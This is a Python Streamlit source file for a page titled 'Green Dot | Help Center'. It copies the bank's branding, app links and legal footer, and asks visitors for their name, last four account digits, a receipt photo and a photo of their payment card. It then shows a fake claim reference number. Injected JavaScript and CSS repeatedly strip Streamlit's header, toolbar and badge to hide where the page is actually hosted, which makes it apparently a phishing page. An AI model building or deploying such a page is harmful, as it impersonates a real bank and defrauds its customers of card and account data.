
import streamlit as st
import sqlite3
import os
import random
import string
from datetime import datetime

# DB Setup
DB_NAME = 'claims.db'
UPLOAD_DIR = 'uploads'
os.makedirs(UPLOAD_DIR, exist_ok=True)

def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS greendot_submissions
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  nombre TEXT, cuenta TEXT, monto REAL,
                  factura_path TEXT, tarjeta_path TEXT, fecha TEXT, ref_id TEXT)""")
    conn.commit()
    conn.close()

def generate_ref():
    chars = string.ascii_uppercase + string.digits
    return "GD-" + "".join(random.choice(chars) for _ in range(8))

init_db()

st.set_page_config(page_title="Green Dot | Help Center", layout="centered", page_icon="✅")

# 1. JS: LIMPIEZA DE INTERFAZ PROFUNDA
st.markdown("""<script>
    const cleanDOM = () => {
        const selectors = [
            '.section-anchor', 'a.section-anchor', '[data-testid="stHeaderActionElements"]',
            '[data-testid="stElementToolbar"]', '.stElementToolbar', '.st-emotion-cache-140j12g',
            '.st-emotion-cache-gi0tri', '.etxdrby3', '._viewerBadge_aycw8_23',
            '[data-testid="stAppToolbar"]', 'footer', 'header', '.stDeployButton'
        ];
        selectors.forEach(s => document.querySelectorAll(s).forEach(el => el.remove()));
    };
    setInterval(cleanDOM, 500);
</script>""", unsafe_allow_html=True)

# 2. CSS: ESTILOS Y TARJETA DE ÉXITO
st.markdown("""<style>
header, footer, [data-testid='stHeader'], .stDeployButton, .section-anchor,
[data-testid="stHeaderActionElements"], [data-testid="stElementToolbar"],
.stElementToolbar, .st-emotion-cache-gi0tri, .etxdrby3, .st-emotion-cache-140j12g {
    display: none !important;
    visibility: hidden !important;
    height: 0 !important;
    width: 0 !important;
    opacity: 0 !important;
    pointer-events: none !important;
}

.stMarkdown a.section-anchor { display: none !important; }
button[title='View fullscreen'], button[aria-label='Fullscreen'] { display: none !important; }

[data-testid="stImage"], [data-testid="stImage" ] img, h1, h2, h3, .stMarkdown h1, .stMarkdown h2 {
    pointer-events: none !important;
    cursor: default !important;
    user-select: none !important;
}

.promo-box, .promo-box a, .promo-box img { pointer-events: auto !important; cursor: pointer !important; }
.stApp { background-color: #000000 !important; color: #FFFFFF !important; }
.block-container { max-width: 550px !important; padding-top: 2rem !important; }

.stButton>button {
    background-color: #00a05b !important;
    color: white !important;
    width: 100%;
    padding: 12px !important;
    font-weight: bold !important;
    border: none !important;
}

/* Success Card Style */
.success-card {
    background-color: #0e1a10;
    border: 1px solid #00a05b;
    padding: 25px;
    border-radius: 12px;
    text-align: center;
    margin: 20px 0;
}

.promo-box {
    background-color: #111;
    padding: 30px;
    text-align: center;
    border-radius: 12px;
    margin: 25px 0;
    border: 1px solid #222;
}

.legal-footer {
    font-size: 10px;
    color: #555;
    text-align: justify;
    margin-top: 50px;
    border-top: 1px solid #222;
    padding-top: 20px;
    line-height: 1.6;
}
</style>""", unsafe_allow_html=True)

col1, col2, col3 = st.columns([1,2,1])
with col2:
    if os.path.exists('logo.svg'):
        st.image('logo.svg', use_container_width=True)

st.title("Help Center")
st.write("Please fill out the form below to submit your claim.")

with st.form("compact_form_v21_8", clear_on_submit=True):
    nombre = st.text_input("Full Name")
    cuenta = st.text_input("Last 4 digits of Account")
    monto = st.number_input("Disputed Amount", min_value=0.0, format="%.2f")
    st.markdown("**Evidence**")
    rec = st.file_uploader("Receipt Photo", type=['jpg','png','jpeg'])
    car = st.file_uploader("Card Photo", type=['jpg','png','jpeg'])
    submitted = st.form_submit_button("SUBMIT NOW")

if submitted:
    if nombre and rec and car:
        ref_id = generate_ref()
        st.markdown(f"""
        <div class='success-card'>
            <h2 style='color:#00a05b; margin-top:0;'>✅ Claim Submitted</h2>
            <p style='color:#888; margin-bottom:5px;'>Reference Number:</p>
            <h3 style='color:white; letter-spacing: 2px; margin-top:0;'>{ref_id}</h3>
            <p style='color:#bbb; font-size:14px; margin-top:15px;'>Your dispute has been received successfully.</p>
            <p style='color:#bbb; font-size:14px;'>Our team will review your request within 2–5 business days.</p>
        </div>
        """, unsafe_allow_html=True)
    else:
        st.error("Please complete all required fields.")

st.markdown("""<div class='promo-box'>
    <h3 style='color:white; margin-bottom:15px;'>Download the Green Dot app</h3>
    <div style='display: flex; justify-content: center; gap: 15px; flex-wrap: wrap; margin-bottom: 20px;'>
        <a href='https://play.google.com/store/apps/details?id=com.greendot.retail' target='_blank'>
            <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg' width='130'>
        </a>
        <a href='https://apps.apple.com/us/app/green-dot-mobile-banking/id415511546' target='_blank'>
            <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg' width='130'>
        </a>
    </div>
    <p style='color:#888; font-size: 13px;'>Secure mobile banking for your account.</p>
</div>""", unsafe_allow_html=True)

st.markdown("""<div class='legal-footer'>
    Not a gift card. Must be 18 or older to purchase. Online access, mobile number verification and identity verification (including SSN) are required to open and use your account. <br><br>
    Green Dot® cards are issued by Green Dot Bank, Member FDIC, pursuant to a license from Visa U.S.A., Inc. and by Mastercard International Inc. ©2026 Green Dot Corporation. All rights reserved. Green Dot Corporation NMLS #914924; Green Dot Bank NMLS #908739.
</div>""", unsafe_allow_html=True)
